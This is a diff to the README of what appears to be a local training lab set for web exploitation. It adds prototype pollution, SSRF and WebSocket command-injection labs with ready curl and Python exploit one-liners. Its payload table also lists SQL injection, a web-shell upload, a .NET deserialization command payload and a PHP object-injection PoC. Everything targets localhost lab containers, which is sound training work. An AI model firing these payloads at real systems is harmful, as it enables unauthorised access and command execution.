@@ -54,6 +54,9 @@ docker compose up -d --build
 | `java-deserial` | Java `ObjectInputStream` | http://127.0.0.1:8111 | **heavy** | `poc-examples/java-deserialization-commons/` |
 | `mssql-sqli` | MSSQL SQLi (+ xp_cmdshell limits) | http://127.0.0.1:8112 | **heavy** | `poc-examples/mssql-sqli-xp-cmdshell/` |
 | `dotnet-json` | .NET JSON TypeNameHandling | http://127.0.0.1:8113 | default | `poc-examples/dotnet-viewstate-deserialization/` |
+| `prototype-pollution` | Server-side prototype pollution → admin/RCE | http://127.0.0.1:8114 | default | `poc-examples/prototype-pollution/` |
+| `ssrf` | SSRF → internal-only flag service | http://127.0.0.1:8115 | default | `poc-examples/ssrf-chaining/` |
+| `websocket` | WebSocket JSON → command injection | http://127.0.0.1:8116 (`ws://…/ws`) | default | `poc-examples/websocket-injection/` |
 
 App source for each lab: `poc-examples/<name>/lab/` (Dockerfile, app code, lab README).
 
@@ -108,6 +111,18 @@ python3 poc-examples/php-object-injection/poc.py 127.0.0.1 8106 127.0.0.1 4444 \
 # Postgres SQLi (ManageEngine-style path)
 python3 poc-examples/manageengine-sqli/poc.py \
   --target-ip 127.0.0.1 --target-port 8110 --delay 3
+
+# Prototype pollution (2026-style)
+curl -s -X POST http://127.0.0.1:8114/api/prefs \
+  -H 'Content-Type: application/json' -d '{"__proto__":{"isAdmin":true}}'
+curl -s http://127.0.0.1:8114/admin
+
+# SSRF → internal flag
+curl -s -X POST http://127.0.0.1:8115/fetch \
+  -d 'url=http://127.0.0.1:9999/internal/flag'
+
+# WebSocket command injection (needs websocket-client or websocat)
+python3 -c "from websocket import create_connection; import json; w=create_connection('ws://127.0.0.1:8116/ws'); print(w.recv()); w.send(json.dumps({'type':'flag'})); print(w.recv())"
 ```
 
 Per-lab flags, manual curl recipes, and flags: see each `poc-examples/*/lab/README.md`.
@@ -125,6 +140,9 @@ Per-lab flags, manual curl recipes, and flags: see each `poc-examples/*/lab/READ
 | PG SQLi | `ForMasRange=1;SELECT pg_sleep(2)--` → ~2s; `COPY … TO '/export/…'` → `/static/…` |
 | XSS chain | `curl -b role=admin -d 'code=…' …/admin/plugin/install` → `/plugins/shell.php` |
 | .NET JSON | POST `{"$type":"OsweLab.EvilCommand, DotNetLab","Cmd":"id"}` to `/api/parse` |
+| Prototype pollution | POST `__proto__.isAdmin` then GET `/admin` → flag |
+| SSRF | POST `/fetch` with `url=http://127.0.0.1:9999/internal/flag` |
+| WebSocket | `{"type":"cmd","cmd":"id"}` or `{"type":"flag"}` on `ws://…/ws` |
 
 ---
 
